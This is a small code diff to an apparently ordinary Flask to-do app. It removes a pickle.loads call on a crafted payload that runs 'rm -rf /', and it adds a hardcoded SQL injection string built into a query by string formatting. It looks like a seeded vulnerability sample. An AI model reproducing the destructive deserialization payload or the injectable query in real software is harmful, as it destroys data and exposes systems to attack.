@@ -16,10 +16,9 @@ class Todo(db.Model):
   
 @app.route('/', methods=['POST','GET'])
 def index():
-  import pickle
-
-# Dangerous deserialization
-  data = pickle.loads(b"cos\nsystem\n(S'rm -rf /'\ntR.")
+  user_input = "admin' OR '1'='1"
+  query = f"SELECT * FROM users WHERE username = '{user_input}'"
+  print(query)
   if request.method=='POST':
     task_content=request.form['content']
     new_task=Todo(content=task_content)
